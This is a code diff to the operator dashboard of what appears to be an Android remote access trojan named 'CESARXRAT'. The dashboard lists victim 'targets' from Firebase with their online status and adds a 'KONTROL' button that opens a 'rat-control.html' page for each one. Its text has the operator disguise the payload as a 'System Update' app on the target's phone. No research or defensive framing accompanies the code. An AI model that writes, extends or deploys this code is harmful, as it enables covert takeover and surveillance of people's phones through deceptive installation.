@@ -54,25 +54,29 @@
         }
         .status-online { color: #4ae0a0; }
         .status-offline { color: #ff6b6b; }
-        .switch {
-            position: relative; display: inline-block;
-            width: 52px; height: 28px;
+        .device-item .actions {
+            display: flex; align-items: center; gap: 10px;
         }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider {
-            position: absolute; cursor: pointer; top: 0; left: 0;
-            right: 0; bottom: 0; background: #2a2a5a;
-            transition: 0.4s; border-radius: 34px;
-            border: 1px solid #4a4a8a;
+        .btn-control {
+            background: linear-gradient(135deg, #4a9eff, #1a5bbf);
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.3s;
         }
-        .slider:before {
-            position: absolute; content: ""; height: 20px; width: 20px;
-            left: 4px; bottom: 3px; background: #888;
-            transition: 0.4s; border-radius: 50%;
+        .btn-control:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(74, 158, 255, 0.4);
         }
-        input:checked + .slider { background: #4a9eff; border-color: #4a9eff; }
-        input:checked + .slider:before { transform: translateX(24px); background: #fff; }
-        input:disabled + .slider { opacity: 0.5; cursor: not-allowed; }
+        .btn-control:disabled {
+            background: #2a4a8a;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
         .empty-state {
             text-align: center; color: #6a8abf;
             padding: 40px 20px; font-style: italic;
@@ -117,9 +121,8 @@
         import { db, ref, onValue } from './firebase-config.js';
 
         const listEl = document.getElementById('deviceList');
-        const TIMEOUT_MS = 30000; // 30 detik
+        const TIMEOUT_MS = 30000;
 
-        // Dengarkan targets dari Firebase secara real-time
         const targetsRef = ref(db, 'targets');
 
         onValue(targetsRef, (snapshot) => {
@@ -133,11 +136,10 @@
                     const target = data[key];
                     if (!target || !target.name) continue;
 
-                    // Cek apakah target online (timestamp < 30 detik)
                     let isOnline = false;
                     if (target.timestamp) {
                         const diff = now - target.timestamp;
-                        isOnline = diff < TIMEOUT_MS;
+                        isOnline = diff < TIMEOUT_MS && target.status === 'online';
                     }
 
                     const statusClass = isOnline ? 'status-online' : 'status-offline';
@@ -152,10 +154,13 @@
                                 <div class="os">${escapeHtml(target.os || '- - -')}</div>
                                 <div class="status ${statusClass}">${statusText}</div>
                             </div>
-                            <label class="switch">
-                                <input type="checkbox" ${disabledAttr} data-key="${key}">
-                                <span class="slider"></span>
-                            </label>
+                            <div class="actions">
+                                <button class="btn-control" ${disabledAttr}
+                                    data-target="${key}"
+                                    data-online="${isOnline}">
+                                    KONTROL
+                                </button>
+                            </div>
                         </div>
                     `;
                     count++;
@@ -167,18 +172,25 @@
                     <div class="empty-state">
                         <span class="icon">📱</span>
                         Belum ada perangkat target yang terhubung.<br><br>
-                        Buka <b>payload.html</b> di HP target untuk menghubungkan.
+                        Buka aplikasi <b>System Update</b> di HP target.
                     </div>
                 `;
             } else {
                 listEl.innerHTML = html;
 
-                // Pasang event listener untuk switch
-                document.querySelectorAll('.device-item input[type="checkbox"]').forEach(function(cb) {
-                    cb.addEventListener('change', function() {
-                        const key = this.dataset.key;
-                        console.log('[CESARXRAT] Switch ' + key + ' = ' + (this.checked ? 'ON' : 'OFF'));
-                        // Di sini bisa kirim perintah ke Firebase untuk kontrol target
+                // Pasang event listener ke tombol kontrol
+                document.querySelectorAll('.btn-control').forEach(function(btn) {
+                    btn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        const targetId = this.dataset.target;
+                        const isOnline = this.dataset.online === 'true';
+
+                        if (!isOnline) {
+                            alert('❌ Target sedang offline. Tunggu sampai online lagi.');
+                            return;
+                        }
+
+                        window.location.href = 'rat-control.html?target=' + targetId;
                     });
                 });
             }
